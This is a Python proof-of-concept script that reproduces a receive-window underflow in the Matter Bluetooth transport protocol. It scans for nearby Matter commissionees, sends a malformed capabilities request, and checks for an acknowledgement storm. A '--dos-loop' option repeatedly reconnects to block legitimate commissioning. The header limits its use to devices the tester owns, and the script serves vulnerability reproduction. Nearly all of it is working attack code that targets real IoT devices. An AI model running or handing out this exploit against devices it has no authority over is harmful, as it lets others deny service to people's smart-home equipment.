#!/usr/bin/env python3
# Reproduce the BTP receive-window underflow against a real Matter
# commissionee over BLE. This is the BTP twin of the WiFiPAF bug fixed in
# project-chip/connectedhomeip#43031, sitting at
# src/ble/BLEEndPoint.cpp:1014-1015 (peripheral side, capped but no
# minimum) and :1080 (central side, no cap and no minimum).
#
# AUTHORIZED TESTING ONLY. Run only against a Matter commissionee you
# own — typically a freshly built chip-all-clusters-app on a second
# Linux box, an ESP32 dev kit in commissioning mode, or an nRF dev kit.
# Do not point this at consumer-deployed devices.
#
# Mechanism
# ---------
# 1. Scan for advertisements containing the Matter BTP service UUID
#    (0000fff6-0000-1000-8000-00805f9b34fb).
# 2. Connect, subscribe to indications on CHAR_2 (TX from peripheral).
# 3. Write a 9-byte BTP capabilities-request to CHAR_1 with the
#    fuzzer-chosen mWindowSize value.
# 4. Wait for the cap-response indication and read the peripheral's
#    chosen window size.
#
# Verdict
# -------
#   - Peripheral indicates a cap-response   -> peripheral accepted the
#                                              malformed window. Bug 1a
#                                              is reachable on this
#                                              build (or the build is
#                                              already-fixed only on
#                                              one path).
#   - GATT disconnects before cap-response  -> peripheral aborted, fix
#                                              is in place (or another
#                                              error path triggered).
#
# Signal strength: a malicious central can race a window=0 cap-request
# in front of the legitimate one during the commissioning window, which
# is enough to make the commissionee's mRemoteReceiveWindowSize
# underflow on the first cap-response indication
# (src/ble/BLEEndPoint.cpp:224). The visible effect is a stuck or
# corrupted handshake rather than memory-corruption — protocol-level
# DoS rather than RCE — but the same primitive on the central path
# (line 1080, no cap at all) lets a hostile peripheral force the
# central to believe the negotiated window is 255, which has heap-
# pressure / amplification implications.
#
# Usage
# -----
#   python3 scripts/tests/btp_window_underflow_repro.py --window-size 0
#
# Root is NOT required: bleak talks to BlueZ over D-Bus, so being in the
# `bluetooth` group is enough on Ubuntu/Debian. If you must use sudo (some
# kernels still gate HCI access), invoke pyenv's interpreter explicitly so
# `bleak` is importable:
#   sudo -E "$(which python3)" scripts/tests/btp_window_underflow_repro.py \
#       --window-size 0
#
# Prereqs
# -------
#   python3 -m pip install bleak
#   Linux BlueZ stack, hci0 up, no other agent connected to the device.
#
# Tested against
# --------------
#   chip-all-clusters-app on Ubuntu 24.04 (BlueZ 5.72) commissioning
#   window open (call ./chip-all-clusters-app --discriminator 3840).

import argparse
import asyncio
import contextlib
import os
import struct
import sys
from typing import Optional

try:
    from bleak import BleakClient, BleakScanner
    from bleak.backends.device import BLEDevice
except ImportError:
    print("error: bleak not importable from this interpreter "
          f"({sys.executable}).", file=sys.stderr)
    print("       install with `python3 -m pip install bleak`, and if you "
          "are running under sudo make sure to invoke pyenv's python "
          "explicitly: `sudo -E \"$(which python3)\" ...`",
          file=sys.stderr)
    sys.exit(2)


MATTER_SVC_UUID = "0000fff6-0000-1000-8000-00805f9b34fb"
CHAR_1_UUID = "18ee2ef5-263d-4559-959f-4f9c429f9d11"  # central -> peripheral (write)
CHAR_2_UUID = "18ee2ef5-263d-4559-959f-4f9c429f9d12"  # peripheral -> central (indicate)

# BTP capabilities-request layout (BleLayer.cpp:157-178, length=9):
#   byte 0..1 : 0x65 0x6C  CAPABILITIES_MSG_CHECK_BYTE_1/2
#   byte 2..5 : 4-byte supported-version array, nibble-packed
#               (index 0 -> low nibble of byte 2, index 1 -> high nibble of
#                byte 2, index 2 -> low nibble of byte 3, ...).
#               Current builds only support V4, so byte 2 = 0x04 is enough.
#   byte 6..7 : mMtu LE16
#   byte 8    : mWindowSize    <-- the field we are attacking
def build_cap_request(window_size: int, mtu: int = 247) -> bytes:
    versions = bytes([0x04, 0x00, 0x00, 0x00])  # advertise V4 in slot 0
    return struct.pack("<BB4sHB", 0x65, 0x6C, versions, mtu, window_size)


def parse_cap_response(payload: bytes) -> Optional[dict]:
    if len(payload) < 6:
        return None
    if payload[0] != 0x65 or payload[1] != 0x6C:
        return None
    return {
        "selected_version": payload[2],
        "fragment_size": int.from_bytes(payload[3:5], "little"),
        "window_size": payload[5],
    }


async def find_matter_device(timeout: float, target_mac: Optional[str]) -> BLEDevice:
    print(f"[*] scanning for Matter BLE service ({MATTER_SVC_UUID}) for {timeout}s...")
    devs = await BleakScanner.discover(timeout=timeout, return_adv=True)
    matches = []
    for dev, adv in devs.values():
        uuids = [u.lower() for u in (adv.service_uuids or [])]
        if MATTER_SVC_UUID in uuids:
            if target_mac and dev.address.lower() != target_mac.lower():
                continue
            matches.append((dev, adv))
    if not matches:
        raise SystemExit("error: no Matter commissionee found in advertising window")
    if len(matches) > 1 and not target_mac:
        print("[!] multiple Matter devices found, picking strongest RSSI:")
        for dev, adv in matches:
            print(f"    {dev.address}  rssi={adv.rssi}  name={dev.name!r}")
    matches.sort(key=lambda da: -(da[1].rssi or -127))
    chosen, adv = matches[0]
    print(f"[+] target: {chosen.address}  rssi={adv.rssi}  name={chosen.name!r}")
    return chosen


async def run_probe(device: BLEDevice, window_size: int, observe_seconds: float) -> int:
    cap_response_event = asyncio.Event()
    cap_response_payload: Optional[bytes] = None
    indications: list[bytes] = []

    def on_indicate(_handle, data: bytearray):
        nonlocal cap_response_payload
        b = bytes(data)
        indications.append(b)
        if cap_response_payload is None:
            cap_response_payload = b
            cap_response_event.set()

    print(f"[*] connecting to {device.address}...")
    async with BleakClient(device, timeout=20.0) as client:
        if not client.is_connected:
            print("[-] failed to connect")
            return 2

        # Order matters: the Matter peripheral's BLEEndPoint is created on the
        # first write to CHAR_1, and HandleSubscribeReceived requires that
        # endpoint to already exist (otherwise the peripheral logs "No endpoint
        # for received subscribe" and drops the subscribe). So we write the
        # cap-request FIRST, then subscribe — that way the subscribe lands
        # while mState == kState_Connecting and triggers the indication
        # (and the bug-A decrement at BLEEndPoint.cpp:224).
        cap_req = build_cap_request(window_size)
        print(f"[*] writing malformed cap-request: window_size={window_size}  bytes={cap_req.hex()}")
        await client.write_gatt_char(CHAR_1_UUID, cap_req, response=True)

        print("[*] subscribing to CHAR_2 indications (post-write)")
        await client.start_notify(CHAR_2_UUID, on_indicate)

        print(f"[*] waiting {observe_seconds}s for cap-response indication...")
        with contextlib.suppress(asyncio.TimeoutError):
            await asyncio.wait_for(cap_response_event.wait(), timeout=observe_seconds)

        # Stress probe: do NOT swap notifies (that tears down the AcquireIndicate
        # socket on Linux BlueZ peripherals and ends the storm with "Broken pipe").
        # Just keep the same callback collecting indications and watch the count
        # grow at the GATT round-trip rate (~10-30/s on BLE).
        n_before = len(indications)
        stress_seconds = float(os.environ.get("HOLD_SECONDS", "5.0"))
        print(f"[*] holding link {stress_seconds}s to observe possible ACK storm...")
        # Periodic progress so a long hold is observable
        end_time = asyncio.get_event_loop().time() + stress_seconds
        last_count = n_before
        last_t = asyncio.get_event_loop().time()
        while asyncio.get_event_loop().time() < end_time:
            await asyncio.sleep(min(5.0, end_time - asyncio.get_event_loop().time()))
            now = asyncio.get_event_loop().time()
            curr = len(indications)
            window_rate = (curr - last_count) / max(now - last_t, 0.001)
            print(f"    +{now - last_t:.1f}s  total={curr - n_before:5d}  rate={window_rate:.1f}/s  link_up={client.is_connected}")
            last_count = curr
            last_t = now
            if not client.is_connected:
                print("    central-side link dropped before hold expired")
                break
        n_after = len(indications)
        post_handshake = n_after - n_before
        rate = post_handshake / stress_seconds
        print(f"[*] post-handshake indications received: {post_handshake}  ({rate:.1f}/s)")
        if post_handshake >= 2:
            print("[!] ACK storm CONFIRMED: peripheral kept emitting indications")
            print("    after the cap-response. This is the BleConfig.h:155-159")
            print("    'immediate stand-alone acks forever' hazard, fired by a peer.")

        with contextlib.suppress(Exception):
            await client.stop_notify(CHAR_2_UUID)

        if cap_response_payload is None:
            if not client.is_connected:
                print("[+] verdict: peripheral DISCONNECTED before responding.")
                print("    → window_size=%u was rejected (likely fixed build, or other abort path)" % window_size)
                return 0
            print("[?] verdict: no indication received but link still up.")
            print("    Increase --observe-seconds, or the device may be wedged. Inspect device logs.")
            return 1

        parsed = parse_cap_response(cap_response_payload)
        print(f"[!] cap-response indicated: raw={cap_response_payload.hex()}  parsed={parsed}")
        if parsed and parsed["window_size"] < 3:
            print("[!] verdict: VULNERABLE.")
            print(f"    Peripheral accepted window_size={parsed['window_size']} (< 3).")
            print("    On the next indication-decrement (HandleSubscribeReceived /")
            print("    SendCharacteristic) mRemoteReceiveWindowSize will underflow to 0xFF.")
            return 11
        if parsed:
            print("[+] verdict: peripheral capped to a safe value -> not directly")
            print(f"    exploitable on this build (selected window_size={parsed['window_size']}).")
            return 0
        print("[?] verdict: response did not parse as a cap-response.")
        return 1


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Probe a Matter commissionee for the BTP receive-window "
                    "underflow (PR #43031 BTP twin).")
    parser.add_argument("--window-size", type=int, default=0,
                        help="malicious mWindowSize (0..255). Try 0, 1, 2.")
    parser.add_argument("--target-mac", default=None,
                        help="MAC of the commissionee to target (skip scan filtering)")
    parser.add_argument("--scan-seconds", type=float, default=8.0,
                        help="BLE scan duration before connecting")
    parser.add_argument("--observe-seconds", type=float, default=4.0,
                        help="seconds to wait for cap-response indication")
    parser.add_argument("--dos-loop", action="store_true",
                        help="continuously reconnect+attack to hold the BLE slot. "
                             "Useful for measuring commissioning denial: try to "
                             "commission with chip-tool while this is running.")
    parser.add_argument("--max-iterations", type=int, default=0,
                        help="Stop --dos-loop after N iterations. 0 = infinite.")
    args = parser.parse_args()

    if not 0 <= args.window_size <= 255:
        parser.error("--window-size must be 0..255")

    device = asyncio.run(find_matter_device(args.scan_seconds, args.target_mac))

    if not args.dos_loop:
        return asyncio.run(run_probe(device, args.window_size, args.observe_seconds))

    print(f"[*] DoS loop mode: target={device.address}  window_size={args.window_size}")
    print("    Try `chip-tool pairing ...` from another machine during this loop")
    print("    and observe how often legitimate commissioning succeeds.")
    iteration = 0
    try:
        while args.max_iterations == 0 or iteration < args.max_iterations:
            iteration += 1
            print(f"\n=== iteration {iteration} ===")
            try:
                asyncio.run(run_probe(device, args.window_size, args.observe_seconds))
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"[!] iteration {iteration} error: {e!r}, continuing")
            # Small cooldown so BlueZ can settle before reconnecting.
            asyncio.run(asyncio.sleep(0.2))
    except KeyboardInterrupt:
        print(f"\n[*] interrupted after {iteration} iteration(s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
